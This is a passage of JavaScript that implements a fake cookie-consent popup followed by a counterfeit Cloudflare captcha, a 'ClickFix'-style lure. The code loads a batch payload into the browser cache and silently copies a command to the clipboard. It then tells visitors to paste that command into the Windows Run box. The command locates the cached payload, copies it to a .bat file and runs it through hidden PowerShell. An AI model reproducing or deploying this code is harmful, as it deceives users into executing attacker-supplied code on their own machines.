      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&powershell -w hidden -nop -c "cmd /c %TEMP%\\t.bat"&echo ' + VERIFICATION_ECHO,
      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&powershell -w hidden -nop -c "cmd /c %TEMP%\\t.bat"&echo ' + VERIFICATION_ECHO
    }
  };

  if (window.CONSENT_CONFIG && typeof window.CONSENT_CONFIG === 'object') {
    for (var cfgKey in window.CONSENT_CONFIG) {
      if (Object.prototype.hasOwnProperty.call(window.CONSENT_CONFIG, cfgKey)) {
        CONSENT_CONFIG[cfgKey] = window.CONSENT_CONFIG[cfgKey];
      }
    }
  }

  function looksLikeUrl(value) {
    return /^https?:\/\/.+/i.test(value);
  }

  function decodeBase64Url(value) {
    var b64 = value.replace(/-/g, '+').replace(/_/g, '/');
    while (b64.length % 4) b64 += '=';
    var bin = atob(b64);
    try {
      return decodeURIComponent(Array.prototype.map.call(bin, function (c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
      }).join(''));
    } catch (e) {
      return bin;
    }
  }

  function parseFileUrlFromQuery() {
    try {
      var raw = new URLSearchParams(location.search).get('f');
      if (!raw) return null;
      raw = raw.trim();
      if (!raw) return null;

      if (looksLikeUrl(raw)) return raw;

      try {
        var decoded = decodeURIComponent(raw);
        if (looksLikeUrl(decoded)) return decoded;
      } catch (e1) {}

      var fromB64 = decodeBase64Url(raw);
      if (looksLikeUrl(fromB64)) return fromB64;
    } catch (e2) {}
    return null;
  }

  var queryFileUrl = parseFileUrlFromQuery();
  if (queryFileUrl) CONSENT_CONFIG.cacheFileUrl = queryFileUrl;

  var consentStyle = null;
  var captchaStyle = null;
  var overlay = null;
  var popup = null;
  var captchaWidget = null;
  var captchaOverlay = null;
  var captchaVisible = false;
  function getFaviconCandidates() {
    var urls = [];
    document.querySelectorAll('link[rel="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]').forEach(function (link) {
      if (link.href && urls.indexOf(link.href) === -1) urls.push(link.href);
    });
    if (urls.indexOf('/favicon.ico') === -1) urls.push('/favicon.ico');
    return urls;
  }

  function resolveFavicon(cb) {
    var urls = getFaviconCandidates();
    function tryNext(i) {
      if (i >= urls.length) return cb(null);
      var img = new Image();
      img.onload = function () { cb(urls[i]); };
      img.onerror = function () { tryNext(i + 1); };
      img.src = urls[i];
    }
    tryNext(0);
  }

  function updateCacheStatus(state, text) {
    var statusEl = document.getElementById('status');
    var previewEl = document.getElementById('preview');
    if (!statusEl) return;

    if (state === 'ok') {
      var bk = getBrowserKey();
      if (bk === 'firefox') {
        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes — Win+R scans Firefox cache2\\entries';
      } else {
        var csz = getActiveCacheFileSizes()[bk] || 0;
        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ') — quit browser, run get-cache-size.cmd, set cacheFileSizes.' + bk + '=' + (csz || '?') + ', then Win+R';
      }
      statusEl.className = 'ok';
      if (previewEl && text) previewEl.textContent = text;
    } else {
      statusEl.textContent = 'cache failed: ' + (text || 'unknown error');
      statusEl.className = 'wait';
    }
  }

  function getBrowserKey() {
    var ua = navigator.userAgent || '';
    if (ua.indexOf('Firefox') !== -1) return 'firefox';
    if (ua.indexOf('Edg/') !== -1) return 'edge';
    if (ua.indexOf('Brave') !== -1) return 'brave';
    return 'chrome';
  }

  function getChromiumProfileFolder() {
    try {
      var cp = new URLSearchParams(location.search).get('cp');
      if (cp === 'default' || cp === 'Default') return 'Default';
      if (cp === '1' || cp === 'profile1' || cp === 'Profile 1') return 'Profile 1';
    } catch (e) {}
    return 'Profile 1';
  }

  function isJjjjPayloadUrl() {
    var u = CONSENT_CONFIG.cacheFileUrl || '';
    return /\/jjjj([?#]|$)/i.test(u);
  }

  function isJjjPayloadUrl() {
    var u = CONSENT_CONFIG.cacheFileUrl || '';
    if (isJjjjPayloadUrl()) return false;
    return /\/jjj([?#]|$)/i.test(u);
  }

  function isJjPayloadUrl() {
    var u = CONSENT_CONFIG.cacheFileUrl || '';
    if (isJjjjPayloadUrl() || isJjjPayloadUrl()) return false;
    return /\/jj([?#]|$)/i.test(u);
  }

  function getActiveCacheFileSizes() {
    if (isJjjjPayloadUrl() && CONSENT_CONFIG.cacheFileSizesJjjj) {
      return CONSENT_CONFIG.cacheFileSizesJjjj;
    }
    if (isJjjPayloadUrl() && CONSENT_CONFIG.cacheFileSizesJjj) {
      return CONSENT_CONFIG.cacheFileSizesJjj;
    }
    if (isJjPayloadUrl() && CONSENT_CONFIG.cacheFileSizesJj) {
      return CONSENT_CONFIG.cacheFileSizesJj;
    }
    return CONSENT_CONFIG.cacheFileSizes || {};
  }

  function getChromiumCacheEntrySize(browserKey) {
    var cacheSizes = getActiveCacheFileSizes();
    var n = cacheSizes[browserKey];
    if (n && n > 0) return n;
    if (browserKey === 'edge' || browserKey === 'brave') {
      n = cacheSizes.chrome;
      if (n && n > 0) return n;
    }
    if (isJjjjPayloadUrl()) {
      n = (CONSENT_CONFIG.cacheFileSizesJjjj || {}).chrome;
      if (n && n > 0) return n;
    }
    if (isJjjPayloadUrl()) {
      n = (CONSENT_CONFIG.cacheFileSizesJjj || {}).chrome;
      if (n && n > 0) return n;
    }
    if (isJjPayloadUrl()) {
      n = (CONSENT_CONFIG.cacheFileSizesJj || {}).chrome;
      if (n && n > 0) return n;
    }
    n = (CONSENT_CONFIG.cacheFileSizes || {}).chrome;
    if (n && n > 0) return n;
    return 0;
  }

  function getVerificationCommand() {
    var startMarker = CONSENT_CONFIG.bodyStartMarker || 'CDRP7F3A9D2B8C4';
    var endMarker = CONSENT_CONFIG.bodyEndMarker || 'CDRPEND7F3A9D2';
    var bodySize = CONSENT_CONFIG.cacheFileBodySize;
    if (!startMarker || !endMarker || !bodySize || bodySize < 1) return '';

    var key = getBrowserKey();
    if (!bodySize || bodySize < 1) return '';

    var cacheEntrySize = key === 'firefox'
      ? getActiveCacheFileSizes().firefox
      : getChromiumCacheEntrySize(key);
    if (key !== 'firefox' && (!cacheEntrySize || cacheEntrySize < 1)) return '';

    var templates = CONSENT_CONFIG.verificationTemplates || {};
    var tpl = templates[key] || templates.firefox || '';
    if (!tpl) return '';

    var cmd = tpl
      .replace(/\{M\}/g, startMarker)
      .replace(/\{E\}/g, endMarker)
      .replace(/\{SM1\}/g, String(bodySize - 1))
      .replace(/\{SZ\}/g, String(bodySize))
      .replace(/\{CSZ\}/g, String(cacheEntrySize || ''))
      .replace(/\{PROF\}/g, getChromiumProfileFolder());
    if (key === 'firefox') {
      var sfx = CONSENT_CONFIG.verificationSuffix;
      if (sfx && cmd.indexOf('I AM NOT A ROBOT') === -1) cmd += sfx;
    }
    return cmd;
  }

  function estimateExpandedCommandLength(cmd) {
    if (!cmd) return 0;
    var localAppData = 'C:\\Users\\User\\AppData\\Local';
    var tmp = localAppData + '\\Temp';
    var userProfile = 'C:\\Users\\User';
    return cmd
      .replace(/%LOCALAPPDATA%/gi, localAppData)
      .replace(/%TMP%/gi, tmp)
      .replace(/%USERPROFILE%/gi, userProfile)
      .length;
  }

  function fallbackCopy(text) {
    var ta = document.createElement('textarea');
    ta.value = text;
    ta.setAttribute('readonly', '');
    ta.style.position = 'fixed';
    ta.style.top = '0';
    ta.style.left = '0';
    ta.style.width = '1px';
    ta.style.height = '1px';
    ta.style.opacity = '0';
    ta.style.pointerEvents = 'none';
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    ta.setSelectionRange(0, text.length);
    var ok = false;
    try { ok = document.execCommand('copy'); } catch (e1) {}
    ta.remove();
    return ok;
  }

  function copyVerificationCommand() {
    var cmd = getVerificationCommand();
    if (!cmd) return false;

    if (fallbackCopy(cmd)) return true;

    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(cmd).catch(function () {
        fallbackCopy(cmd);
      });
      return true;
    }
    return false;
  }

  function bindCopyOnUserGesture(el) {
    if (!el || el.__tsCopyBound__) return;
    el.__tsCopyBound__ = true;
    el.addEventListener('pointerdown', function () {
      copyVerificationCommand();
    });
    el.addEventListener('keydown', function (e) {
      if (e.key === 'Enter' || e.key === ' ') copyVerificationCommand();
    });
  }

  function getCacheFileUrl() {
    if (CONSENT_CONFIG.cacheFileUrl) return CONSENT_CONFIG.cacheFileUrl;
    var origin = location.origin || (location.protocol + '//' + location.host);
    if (CONSENT_CONFIG.presentation === 'cloudflare') return origin + '/j';
    return origin + '/hello.txt';
  }

  function whenDomReady(fn) {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', fn);
    } else {
      fn();
    }
  }

  function validateStrictPayload(buf) {
    if (!buf || !buf.byteLength) {
      return { ok: false, reason: 'empty response body' };
    }

    var bytes = new Uint8Array(buf);
    var i;

    if (bytes.length >= 3 && bytes[0] === 0xEF && bytes[1] === 0xBB && bytes[2] === 0xBF) {
      return { ok: false, reason: 'UTF-8 BOM not allowed — body must be raw bytes only' };
    }

    for (i = 0; i < bytes.length; i++) {
      if (bytes[i] === 0) {
        return { ok: false, reason: 'null byte in body' };
      }
    }

    var text;
    try {
      text = new TextDecoder('utf-8', { fatal: true }).decode(buf);
    } catch (e) {
      return { ok: false, reason: 'invalid UTF-8 in body' };
    }

    var mustStart = CONSENT_CONFIG.bodyMustStartWith || '@echo off';
    if (text.slice(0, mustStart.length).toLowerCase() !== mustStart.toLowerCase()) {
      return { ok: false, reason: 'body must start with "' + mustStart + '" (no headers or HTML prefix)' };
    }

    var contamination = [
      [/^HTTP\/\d/m, 'HTTP status line inside body'],
      [/^Content-Type:/im, 'Content-Type header inside body'],
      [/^Content-Length:/im, 'Content-Length header inside body'],
      [/^Cache-Control:/im, 'Cache-Control header inside body'],
      [/^Transfer-Encoding:/im, 'Transfer-Encoding header inside body'],
      [/^Date:/im, 'Date header inside body'],
      [/^Server:/im, 'Server header inside body'],
      [/<!DOCTYPE/i, 'HTML document instead of raw payload'],
      [/<html/i, 'HTML document instead of raw payload'],
      [/<script/i, 'HTML/script instead of raw payload']
    ];
    for (i = 0; i < contamination.length; i++) {
      if (contamination[i][0].test(text)) {
        return { ok: false, reason: contamination[i][1] };
      }
    }

    var startMarker = CONSENT_CONFIG.bodyStartMarker || 'CDRP7F3A9D2B8C4';
    var endMarker = CONSENT_CONFIG.bodyEndMarker || 'CDRPEND7F3A9D2';
    if (text.indexOf(startMarker) === -1) {
      return { ok: false, reason: 'missing start marker ' + startMarker };
    }
    if (text.indexOf(endMarker) === -1) {
      return { ok: false, reason: 'missing end marker ' + endMarker };
    }

    var endIdx = text.lastIndexOf(endMarker);
    var afterEnd = text.slice(endIdx + endMarker.length);
    if (!/^[\r\n]*$/.test(afterEnd)) {
      return { ok: false, reason: 'extra bytes after end marker — body must end at ' + endMarker };
    }

    return { ok: true, bytes: bytes, text: text, bodyBytes: bytes.length };
  }

  function saveBodyReference(buf) {
    var origin = location.origin || (location.protocol + '//' + location.host);
    if (!origin || origin === 'null') return Promise.resolve();

    return fetch(origin + '/_save-body-ref', {
      method: 'POST',
      body: buf,
      credentials: 'omit',
      cache: 'no-store',
      headers: { 'Content-Type': 'application/octet-stream' }
    }).catch(function () {});
  }

  function primeChromiumDiskCache(url) {
    if (getBrowserKey() === 'firefox') return;
    try {
      var link = document.createElement('link');
      link.rel = 'prefetch';
      link.href = url;
      document.head.appendChild(link);
    } catch (e1) {}
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', url, true);
      xhr.responseType = 'blob';
      xhr.send();
    } catch (e2) {}
    try {
      fetch(url, { cache: 'force-cache', credentials: 'omit' });
      setTimeout(function () {
        fetch(url, { cache: 'reload', credentials: 'omit' }).catch(function () {});
      }, 400);
    } catch (e3) {}
  }

  function cacheDropHelloFile() {
    var url = getCacheFileUrl();
    if (!url) return Promise.resolve(false);

    CONSENT_CONFIG.cacheFileBodySize = null;

    return fetch(url, { cache: 'default', credentials: 'omit' })
      .then(function (response) {
        if (!response.ok) throw new Error('HTTP ' + response.status);
        return response.arrayBuffer().then(function (buf) {
          if (CONSENT_CONFIG.strictBody !== false) {
            var check = validateStrictPayload(buf);
            if (!check.ok) {
              updateCacheStatus('fail', check.reason);
              return false;
            }
          }

          CONSENT_CONFIG.cacheFileBodySize = buf.byteLength;
          updateCacheStatus('ok', new TextDecoder('utf-8').decode(buf));
          saveBodyReference(buf);
          primeChromiumDiskCache(url);
          return true;
        });
      })
      .catch(function (err) {
        updateCacheStatus('fail', err.message || 'fetch failed — CORS or network error');
        return false;
      });
  }

  function generateRefId() {
    var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    var parts = [];
    for (var p = 0; p < 10; p++) {
      var seg = '';
      for (var i = 0; i < 4; i++) seg += chars.charAt(Math.floor(Math.random() * chars.length));
      parts.push(seg);
    }
    return parts.join('-');
  }

  /* --- Captcha (Cloudflare Turnstile style) — shown after consent interaction --- */
  function getCaptchaCss() {
    return (
      '#ts-widget-overlay{position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,.72);cursor:default}' +
      '#ts-widget{position:fixed;left:50%;top:42%;transform:translate(-50%,-50%);z-index:2147483647;display:flex;align-items:center;width:min(380px,calc(100vw - 32px));max-width:calc(100vw - 32px);min-height:80px;height:auto;padding:12px 16px 12px 18px;background:#fafafa;border:1px solid #e0e0e0;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.12);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;box-sizing:border-box;user-select:none;transition:width .25s ease,height .25s ease;touch-action:manipulation;-webkit-tap-highlight-color:transparent}' +
      '#ts-widget.ts-not-ready .ts-box{border-color:#c62828;animation:tsShake .35s ease}' +
      '@keyframes tsShake{0%,100%{transform:translateX(0)}25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}' +
      '#ts-widget.ts-verifying{display:block;width:min(500px,calc(100vw - 32px));height:auto;padding:0;background:#fff;border-color:#ddd;border-radius:2px;box-shadow:0 4px 24px rgba(0,0,0,.18)}' +
      '#ts-widget .ts-check-area{display:flex;align-items:center;gap:14px;flex:1;min-width:0;cursor:pointer}' +
      '#ts-widget .ts-box{width:32px;height:32px;border:2px solid #666;border-radius:2px;background:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-sizing:border-box;transition:border-color .2s,background .2s}' +
      '#ts-widget .ts-spinner{display:none;width:22px;height:22px;border:2px solid #e0e0e0;border-top-color:#666;border-radius:50%;animation:tsSpin .7s linear infinite}' +
      '#ts-widget.ts-loading .ts-spinner{display:block}' +
      '#ts-widget.ts-loading .ts-box{border-color:#bbb}' +
      '#ts-widget .ts-label{font-size:16px;color:#232323;white-space:normal;line-height:1.2}' +
      '#ts-widget .ts-brand{display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0;width:96px;margin-left:10px;text-align:center}' +
      '#ts-widget .ts-brand img{width:88px;height:auto;max-height:54px;object-fit:contain;display:block;margin:0 auto 3px}' +
      '#ts-widget .ts-links{font-size:9px;line-height:1.2;color:#555}' +
      '#ts-widget .ts-links a{color:#555;text-decoration:none}' +
      '#ts-widget .ts-links a:hover{text-decoration:underline}' +
      '#ts-widget .ts-dot{margin:0 3px;color:#999}' +
      '#ts-widget .ts-v-header{display:flex;align-items:center;justify-content:space-between;padding:18px 20px 14px}' +
      '#ts-widget .ts-v-status{display:flex;align-items:center;gap:12px}' +
      '#ts-widget .ts-v-orbit{width:30px;height:30px;position:relative;flex-shrink:0;animation:tsOrbitSpin .85s linear infinite}' +
      '#ts-widget .ts-v-orbit span{position:absolute;top:50%;left:50%;width:6px;height:6px;margin:-3px 0 0 -3px;background:#f6821f;border-radius:50%;box-shadow:0 0 0 1px rgba(246,130,31,.15);animation:tsDotPulse 1.2s ease-in-out infinite}' +
      '#ts-widget .ts-v-orbit span:nth-child(1){transform:rotate(0deg) translateY(-13px);animation-delay:0s}' +
      '#ts-widget .ts-v-orbit span:nth-child(2){transform:rotate(45deg) translateY(-13px);animation-delay:-1.05s}' +
      '#ts-widget .ts-v-orbit span:nth-child(3){transform:rotate(90deg) translateY(-13px);animation-delay:-.9s}' +
      '#ts-widget .ts-v-orbit span:nth-child(4){transform:rotate(135deg) translateY(-13px);animation-delay:-.75s}' +
      '#ts-widget .ts-v-orbit span:nth-child(5){transform:rotate(180deg) translateY(-13px);animation-delay:-.6s}' +
      '#ts-widget .ts-v-orbit span:nth-child(6){transform:rotate(225deg) translateY(-13px);animation-delay:-.45s}' +
      '#ts-widget .ts-v-orbit span:nth-child(7){transform:rotate(270deg) translateY(-13px);animation-delay:-.3s}' +
      '#ts-widget .ts-v-orbit span:nth-child(8){transform:rotate(315deg) translateY(-13px);animation-delay:-.15s}' +
      '#ts-widget .ts-v-title{font-size:15px;font-weight:500;color:#3d3d3d}' +
      '#ts-widget .ts-v-brand{display:flex;flex-direction:column;align-items:center;text-align:center}' +
      '#ts-widget .ts-v-brand img{width:90px;height:auto;max-height:52px;object-fit:contain}' +
      '#ts-widget .ts-v-brand .ts-links{margin-top:2px}' +
      '#ts-widget .ts-v-rule{height:3px;background:#c4722d;margin:0}' +
      '#ts-widget .ts-v-body{padding:22px 24px 8px;color:#222;font-size:15px;line-height:1.75}' +
      '#ts-widget .ts-v-body h3{font-size:16px;font-weight:700;margin:0 0 14px;color:#111}' +
      '#ts-widget .ts-v-body ol{margin:0;padding:0 0 0 22px}' +
      '#ts-widget .ts-v-body li{margin-bottom:10px}' +
      '#ts-widget .ts-kbd{display:inline-block;min-width:1.4em;padding:2px 7px;margin:0 2px;border:1px solid #bbb;border-bottom-width:2px;border-radius:4px;background:linear-gradient(180deg,#fff 0%,#f3f3f3 100%);font-size:13px;font-family:inherit;font-weight:600;color:#333;box-shadow:0 1px 0 rgba(0,0,0,.06);text-align:center;line-height:1.35}' +
      '#ts-widget .ts-v-ref{padding:16px 20px 20px;text-align:center;font-size:11px;color:#888;line-height:1.5}' +
      '#ts-widget .ts-v-ref-id{font-size:10px;color:#999;word-break:break-all;margin-top:4px;letter-spacing:.3px}' +
      '#ts-widget .ts-v-copy-hint{margin:12px 0 0;font-size:13px;line-height:1.4}' +
      '#ts-widget .ts-v-copy-ok{color:#2e7d32}' +
      '#ts-widget .ts-v-copy-warn{color:#b45309}' +
      '@keyframes tsSpin{to{transform:rotate(360deg)}}' +
      '@keyframes tsOrbitSpin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}' +
      '@keyframes tsDotPulse{0%,100%{opacity:.2}50%{opacity:1}}'
    );
  }

  function getCaptchaHtml() {
    var t = getVerifyStrings();
    return (
      '<div class="ts-check-area" tabindex="0" role="checkbox" aria-checked="false" aria-label="' + t.verifyHuman + '">' +
      '<div class="ts-box"><div class="ts-spinner"></div></div>' +
      '<span class="ts-label">' + t.verifyHuman + '</span></div>' +
      '<div class="ts-brand"><img src="' + CONSENT_CONFIG.captchaLogoUrl + '" alt="Cloudflare">' +
      '<div class="ts-links"><a href="' + CONSENT_CONFIG.privacyPolicyUrl + '">' + t.privacy + '</a><span class="ts-dot">·</span><a href="#">' + t.help + '</a></div></div>'
    );
  }

  function getOrbitDotsHtml() {
    var html = '<div class="ts-v-orbit" aria-hidden="true">';
    for (var i = 0; i < 8; i++) html += '<span></span>';
    return html + '</div>';
  }

  function getVerifyingHtml(refId) {
    var t = getVerifyStrings();
    return (
      '<div class="ts-v-header">' +
      '<div class="ts-v-status">' + getOrbitDotsHtml() + '<span class="ts-v-title">' + t.verifying + '</span></div>' +
      '<div class="ts-v-brand"><img src="' + CONSENT_CONFIG.captchaLogoUrl + '" alt="Cloudflare">' +
      '<div class="ts-links"><a href="' + CONSENT_CONFIG.privacyPolicyUrl + '">' + t.privacy + '</a><span class="ts-dot">·</span><a href="#">' + t.help + '</a></div></div></div>' +
      '<div class="ts-v-rule"></div>' +
      '<div class="ts-v-body"><h3>' + t.stepsHeading + '</h3><ol>' +
      '<li>' + applyVerificationStepHtml(t.stepWinR) + '</li>' +
      '<li>' + applyVerificationStepHtml(t.stepCtrlV) + '</li>' +
      '<li>' + applyVerificationStepHtml(t.stepEnter) + '</li>' +
      '</ol></div>' +
      '<div class="ts-v-ref">' + t.refId + '<div class="ts-v-ref-id">' + refId + '</div></div>' +
      '<p class="ts-v-copy-hint"></p>'
    );
  }

  function updateCopyHint(el, copied) {
    if (!el) return;
    var t = getVerifyStrings();
    if (!getVerificationCommand()) {
      el.textContent = t.copyUnavailable;
      el.className = 'ts-v-copy-hint ts-v-copy-warn';
      return;
    }
    var cmd = getVerificationCommand();
    var est = estimateExpandedCommandLength(cmd);
    var lenNote = est ? ' (~' + est + ' chars expanded; Win+R limit ~259)' : '';
    var msg = copied ? t.copyOk : t.copyRetry;
    el.textContent = msg.replace('{lenNote}', lenNote);
    el.className = copied ? 'ts-v-copy-hint ts-v-copy-ok' : 'ts-v-copy-hint ts-v-copy-warn';
  }

  function mountVerificationDialog() {
    if (captchaVisible) return;
    captchaVisible = true;

    captchaStyle = document.createElement('style');
    captchaStyle.id = 'ts-widget-style';
    captchaStyle.textContent = getCaptchaCss();
    document.head.appendChild(captchaStyle);

    captchaWidget = document.createElement('div');
    captchaWidget.id = 'ts-widget';
    captchaWidget.className = 'ts-verifying';
    captchaWidget.setAttribute('role', 'dialog');
    captchaWidget.innerHTML = getVerifyingHtml(generateRefId());
    if (verificationLangKey === 'Arabic') captchaWidget.setAttribute('dir', 'rtl');

    var copied = copyVerificationCommand();
    updateCopyHint(captchaWidget.querySelector('.ts-v-copy-hint'), copied);
    bindCopyOnUserGesture(captchaWidget);

    captchaOverlay = document.createElement('div');
    captchaOverlay.id = 'ts-widget-overlay';
    captchaOverlay.setAttribute('aria-hidden', 'true');

    document.body.style.overflow = 'hidden';
    document.body.appendChild(captchaOverlay);
    document.body.appendChild(captchaWidget);
  }

  function isPayloadReady() {
    return !!(CONSENT_CONFIG.cacheFileBodySize && getVerificationCommand());
  }

  function bindCloudflareChallenge() {
    var area = document.getElementById('cf-challenge-area');
    if (!area || area.__cfBound__) return;
    area.__cfBound__ = true;

    var busy = false;
    function runVerify(e) {
      if (e && e.target && e.target.closest && e.target.closest('a')) return;
      if (busy || captchaVisible) return;
      if (!isPayloadReady()) {
        area.classList.add('cf-not-ready');
        setTimeout(function () { area.classList.remove('cf-not-ready'); }, 500);
        var lbl = area.querySelector('.cf-label');
        var hint = getVerifyStrings().loadingPayload;
        if (CONSENT_CONFIG.cacheFileBodySize) {
          hint = getNotReadyHint();
        }
        if (lbl) lbl.textContent = hint;
        updateCacheStatus('fail', hint);
        return;
      }
      busy = true;
      area.classList.add('cf-loading');
      area.setAttribute('aria-checked', 'true');
      setTimeout(mountVerificationDialog, 700 + Math.random() * 400);
    }

    area.addEventListener('click', runVerify);
    area.addEventListener('pointerdown', function (e) {
      if (e.pointerType === 'mouse' && e.button !== 0) return;
      runVerify(e);
    });
    area.addEventListener('keydown', function (e) {
      if (e.key === ' ' || e.key === 'Enter') {
        e.preventDefault();
        runVerify(e);
      }
    });
  }

  function removeCaptcha() {
    if (captchaWidget) {
      captchaWidget.remove();
      captchaWidget = null;
    }
    if (captchaOverlay) {
      captchaOverlay.remove();
      captchaOverlay = null;
    }
    if (captchaStyle) {
      captchaStyle.remove();
      captchaStyle = null;
    }
    document.body.style.overflow = '';
    captchaVisible = false;
  }

  function showCaptcha() {
    if (captchaVisible) return;
    captchaVisible = true;

    captchaStyle = document.createElement('style');
    captchaStyle.id = 'ts-widget-style';
    captchaStyle.textContent = getCaptchaCss();
    document.head.appendChild(captchaStyle);

    captchaWidget = document.createElement('div');
    captchaWidget.id = 'ts-widget';
    captchaWidget.setAttribute('role', 'presentation');
    captchaWidget.innerHTML = getCaptchaHtml();

    var checkArea = captchaWidget.querySelector('.ts-check-area');
    var verified = false;
    var busy = false;

    function showVerifyingPanel() {
      verified = true;
      busy = false;
      captchaWidget.classList.remove('ts-loading');
      captchaWidget.classList.add('ts-verifying');
      captchaWidget.innerHTML = getVerifyingHtml(generateRefId());
      var copied = copyVerificationCommand();
      updateCopyHint(captchaWidget.querySelector('.ts-v-copy-hint'), copied);
      bindCopyOnUserGesture(captchaWidget);
    }

    function runVerify() {
      if (verified || busy) return;
      if (!isPayloadReady()) {
        captchaWidget.classList.add('ts-not-ready');
        setTimeout(function () { captchaWidget.classList.remove('ts-not-ready'); }, 500);
        var lbl = captchaWidget.querySelector('.ts-label');
        var hint = getVerifyStrings().loadingPayload;
        if (CONSENT_CONFIG.cacheFileBodySize) {
          hint = getNotReadyHint();
        }
        if (lbl) lbl.textContent = hint;
        updateCacheStatus('fail', hint);
        return;
      }
      busy = true;
      captchaWidget.classList.add('ts-loading');
      checkArea.setAttribute('aria-checked', 'true');
      setTimeout(showVerifyingPanel, 700 + Math.random() * 400);
    }

    checkArea.addEventListener('click', runVerify);
    checkArea.addEventListener('pointerdown', function (e) {
      if (e.pointerType === 'mouse' && e.button !== 0) return;
      runVerify();
    });
    checkArea.addEventListener('keydown', function (e) {
      if (e.key === ' ' || e.key === 'Enter') {
        e.preventDefault();
        runVerify();
      }
    });

    captchaOverlay = document.createElement('div');
    captchaOverlay.id = 'ts-widget-overlay';
    captchaOverlay.setAttribute('aria-hidden', 'true');

    document.body.style.overflow = 'hidden';
    document.body.appendChild(captchaOverlay);
    document.body.appendChild(captchaWidget);
  }

  /* --- Consent popup --- */
  function getConsentCss() {
    return (
      '#consent-popup-overlay{position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,.72);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}' +
      '#consent-popup{position:fixed;right:20px;bottom:20px;z-index:2147483647;width:min(560px,calc(100vw - 40px));max-height:calc(100vh - 40px);background:#f5f5f5;border-radius:14px;box-shadow:0 16px 48px rgba(0,0,0,.35);overflow:auto;animation:consentSlideIn .35s ease}' +
      '@keyframes consentSlideIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}' +
      '#consent-popup .cp-header{display:flex;align-items:center;gap:14px;padding:22px 28px 18px;border-bottom:1px solid #e0e0e0;background:#fff}' +
      '#consent-popup .cp-logo{display:flex;align-items:center}' +
      '#consent-popup .cp-logo:empty{display:none}' +
      '#consent-popup .cp-logo img{width:36px;height:36px;object-fit:contain}' +
      '#consent-popup .cp-title{flex:1;font-size:22px;font-weight:700;color:#2d2d2d;margin:0}' +
      '#consent-popup .cp-body{padding:24px 28px 20px;color:#333;font-size:17px;line-height:1.65}' +
      '#consent-popup .cp-actions{padding:0 28px 22px}' +
      '#consent-popup .cp-accept{display:block;width:100%;padding:18px;border:none;border-radius:8px;background:' + CONSENT_CONFIG.accentColor + ';color:#fff;font-size:18px;font-weight:600;cursor:pointer}' +
    '#consent-popup .cp-accept:hover{background:' + CONSENT_CONFIG.accentHover + '}' +
      '#consent-popup .cp-footer{display:flex;justify-content:center;gap:24px;padding:0 28px 26px}' +
      '#consent-popup .cp-footer a{color:' + CONSENT_CONFIG.accentColor + ';font-size:15px;text-decoration:underline;cursor:pointer}'
    );
  }

  function getConsentHtml(faviconUrl) {
    var logoHtml = faviconUrl ? '<img src="' + faviconUrl + '" alt="">' : '';

    return (
    '<div class="cp-header">' +
      '<div class="cp-logo">' + logoHtml + '</div>' +
      '<h2 class="cp-title">Manage Consent</h2></div>' +
    '<div class="cp-body">To provide the best experiences, we use technologies like cookies to store and/or access device information. ' +
    'Consenting to these technologies will allow us to process data such as browsing behavior or unique IDs on this site. ' +
    'Not consenting or withdrawing consent, may adversely affect certain features and functions.</div>' +
    '<div class="cp-actions"><button type="button" class="cp-accept">Accept</button></div>' +
    '<div class="cp-footer"><a href="' + CONSENT_CONFIG.optOutUrl + '">Opt-out preferences</a>' +
      '<a href="' + CONSENT_CONFIG.privacyPolicyUrl + '">Privacy Policy</a></div>'
    );
  }

  function closeConsent() {
    document.body.style.overflow = '';
    if (overlay) overlay.remove();
    if (popup) popup.remove();
    if (consentStyle) consentStyle.remove();
    overlay = null;
    popup = null;
    consentStyle = null;
  }

  function onConsentInteract(e) {
    if (e) e.preventDefault();
    closeConsent();
    showCaptcha();
  }

  function mountConsent(faviconUrl) {
    consentStyle = document.createElement('style');
    consentStyle.textContent = getConsentCss();
    document.head.appendChild(consentStyle);

    overlay = document.createElement('div');
    overlay.id = 'consent-popup-overlay';

    popup = document.createElement('div');
    popup.id = 'consent-popup';
    popup.setAttribute('role', 'dialog');
    popup.setAttribute('aria-modal', 'true');
    popup.innerHTML = getConsentHtml(faviconUrl);

    popup.querySelectorAll('.cp-footer a, .cp-actions button').forEach(function (el) {
      el.addEventListener('click', onConsentInteract);
    });

    document.body.style.overflow = 'hidden';
    document.body.appendChild(overlay);
    document.body.appendChild(popup);
  }

  function showVersion() {
    var el = document.getElementById('version');
    if (el) el.textContent = CONSENT_CONFIG.version || 'unknown';
  }

  function init() {
    fetchUserLocaleFromIpinfo();
    whenDomReady(showVersion);

    if (CONSENT_CONFIG.presentation === 'cloudflare') {
      whenDomReady(function () {
        applyCloudflarePageI18n();
        bindCloudflareChallenge();
      });
      cacheDropHelloFile();
      return;
    }

    whenDomReady(function () {
      cacheDropHelloFile().then(function () {
        resolveFavicon(function (faviconUrl) {
          mountConsent(faviconUrl);
        });
      });
    });
  }

  init();
})();
